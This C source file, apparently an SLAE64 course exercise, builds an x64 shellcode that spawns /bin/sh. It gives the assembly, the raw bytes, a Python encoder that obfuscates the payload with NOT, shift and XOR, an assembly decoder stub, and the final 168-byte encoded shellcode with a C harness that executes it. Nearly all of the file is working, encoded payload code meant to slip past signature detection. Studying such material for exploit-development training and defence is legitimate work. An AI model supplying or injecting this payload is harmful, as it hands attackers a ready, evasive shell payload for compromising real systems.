/*
######################################## description ########################################

; Title     : X64 [NOT +SHIFT-N+ XOR-N] encoded /bin/sh - shellcode
; Author    : Pedro Cabral
; Twitter   : @CabrallPedro
; LinkedIn  : https://www.linkedin.com/in/pedro-cabral1992
; SLAE ID   : SLAE64 - 1603
; Purpose   : spawn /bin/sh shell
; Tested On : Ubuntu 16.04.6 LTS
; Arch      : x64
; Size      : 168 bytes

########################################## sh.asm ###########################################

global _start

section .text

_start:
        xor rax, rax
        push rax ; push null
        mov rbx, 0x68732f2f6e69622f ;/bin//sh in reverse
        push rbx ; push to the stack
        mov rdi, rsp ; store the /bin//sh on rdi
        push rax ; push null
        mov rdx, rsp ; set rdx
        push rdi ; push the address of /bin//sh
        mov rsi, rsp ; set rsi
        add rax, 59 ; rax = 59 (execve)
        syscall


#################################### original shellcode #####################################

pedro@ubuntu>nasm -felf64 sh.asm -o sh.o
pedro@ubuntu>ld -N -o sh sh.o
pedro@ubuntu>echo;objdump -d ./sh.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g';echo

"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"


########################################  encode.py  ########################################

#!/usr/bin/python

import sys

if len(sys.argv) != 3:
        print "Usage : python encode.py <SHIFT number> <XOR number>"
        sys.exit(0)

shift   = int(sys.argv[1])
xor     = int(sys.argv[2])

shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")


# addition to the inicial of the shellcode the SHIFT and XOR values
encoded_shellcode =""
encoded_shellcode += '0x01' #prevent null bytes on the shellcode
encoded_shellcode += '%02x, ' %shift
encoded_shellcode += '0x'
encoded_shellcode += '%02x, ' %xor

# [NOT + SHL-N + XOR-N] encoded shellcode
for i in bytearray(shellcode):
	new = ~i & 0xff
	new = new << shift
        new = new ^ xor
        encoded_shellcode += '0x'
        encoded_shellcode += '%02x, ' %new

# end of shellcode
encoded_shellcode += '0x'
encoded_shellcode += '%02x, ' %xor
encoded_shellcode += '0x'
encoded_shellcode += '%02x' %xor

# print encoded shellcode
print encoded_shellcode

#################################### Encoded Shellcode  #####################################

pedro@ubuntu>python encoder.py 4 1337
0x0104, 0x539, 0xe49, 0x9d9, 0x6c9, 0xfc9, 0xe49, 0x179, 0x839, 0xce9, 0xc59, 0xc29, 0x839, 0x839, 0xdf9, 0xc49, 0xff9, 0xe49, 0x259, 0x4b9, 0xfc9, 0xe49, 0x259, 0x4e9, 0xfb9, 0xe49, 0x259, 0x4a9, 0xe49, 0x2f9, 0x6c9, 0x979, 0xa39, 0xa99, 0x539, 0x539

####################################### decoder.asm  ########################################

global _start

section .text

_start:

	jmp decoder
	encoded : dw 0x0104, 0x539, 0xe49, 0x9d9, 0x6c9, 0xfc9, 0xe49, 0x179, 0x839, 0xce9, 0xc59, 0xc29, 0x839, 0x839, 0xdf9, 0xc49, 0xff9, 0xe49, 0x259, 0x4b9, 0xfc9, 0xe49, 0x259, 0x4e9, 0xfb9, 0xe49, 0x259, 0x4a9, 0xe49, 0x2f9, 0x6c9, 0x979, 0xa39, 0xa99, 0x539, 0x539

decoder:
	lea rsi, [rel encoded]

	xor rcx, rcx
	xor r9,r9
	xor r10,r10

	mov word cx, [rsi]
	inc rsi
	inc rsi
	mov word r9w, [rsi]
	inc rsi
	inc rsi
	push rsi
	mov rdi, rsi
main: ; 			to deal with 0xff on the original shellcode
	mov word r10w,[rsi]
	xor r10w, r9w
	jz second_check
main2:
	shr r10, cl
	not word r10w
	mov byte [rdi], r10b
	inc rsi
	inc rsi
	inc rdi
	jmp short main

second_check:
	mov word r10w, [rsi+2]
	xor r10w, r9w
	jz call_encoded
	mov word r10w, [rsi]
	xor r10w, r9w
	jmp main2

call_encoded:
	call [rsp]

###################################### final shellcode ######################################

pedro@ubuntu>nasm -felf64 decoder.asm -o decoder.o
pedro@ubuntu>echo;objdump -d ./decoder.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g';echo

"\xeb\x48\x04\x01\x39\x05\x49\x0e\xd9\x09\xc9\x06\xc9\x0f\x49\x0e\x79\x01\x39\x08\xe9\x0c\x59\x0c\x29\x0c\x39\x08\x39\x08\xf9\x0d\x49\x0c\xf9\x0f\x49\x0e\x59\x02\xb9\x04\xc9\x0f\x49\x0e\x59\x02\xe9\x04\xb9\x0f\x49\x0e\x59\x02\xa9\x04\x49\x0e\xf9\x02\xc9\x06\x79\x09\x39\x0a\x99\x0a\x39\x05\x39\x05\x48\x8d\x35\xb1\xff\xff\xff\x48\x31\xc9\x4d\x31\xc9\x4d\x31\xd2\x66\x8b\x0e\x48\xff\xc6\x48\xff\xc6\x66\x44\x8b\x0e\x48\xff\xc6\x48\xff\xc6\x56\x48\x89\xf7\x66\x44\x8b\x16\x66\x45\x31\xca\x74\x15\x49\xd3\xea\x66\x41\xf7\xd2\x44\x88\x17\x48\xff\xc6\x48\xff\xc6\x48\xff\xc7\xeb\xe1\x66\x44\x8b\x56\x02\x66\x45\x31\xca\x74\x0a\x66\x44\x8b\x16\x66\x45\x31\xca\xeb\xd6\xff\x14\x24"

pedro@ubuntu>gcc -fno-stack-protector -z execstack testShellcode.c -o testShellcode
pedro@ubuntu>./testShellcode
Shellcode Length:	168
$ whoami
pedro
*/


#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\xeb\x48\x04\x01\x39\x05\x49\x0e\xd9\x09\xc9\x06\xc9\x0f\x49\x0e\x79\x01\x39\x08\xe9\x0c\x59\x0c\x29\x0c\x39\x08\x39\x08\xf9\x0d\x49\x0c\xf9\x0f\x49\x0e\x59\x02\xb9\x04\xc9\x0f\x49\x0e\x59\x02\xe9\x04\xb9\x0f\x49\x0e\x59\x02\xa9\x04\x49\x0e\xf9\x02\xc9\x06\x79\x09\x39\x0a\x99\x0a\x39\x05\x39\x05\x48\x8d\x35\xb1\xff\xff\xff\x48\x31\xc9\x4d\x31\xc9\x4d\x31\xd2\x66\x8b\x0e\x48\xff\xc6\x48\xff\xc6\x66\x44\x8b\x0e\x48\xff\xc6\x48\xff\xc6\x56\x48\x89\xf7\x66\x44\x8b\x16\x66\x45\x31\xca\x74\x15\x49\xd3\xea\x66\x41\xf7\xd2\x44\x88\x17\x48\xff\xc6\x48\xff\xc6\x48\xff\xc7\xeb\xe1\x66\x44\x8b\x56\x02\x66\x45\x31\xca\x74\x0a\x66\x44\x8b\x16\x66\x45\x31\xca\xeb\xd6\xff\x14\x24";

void main(){
	printf("Shellcode Length:	%zu\n",strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}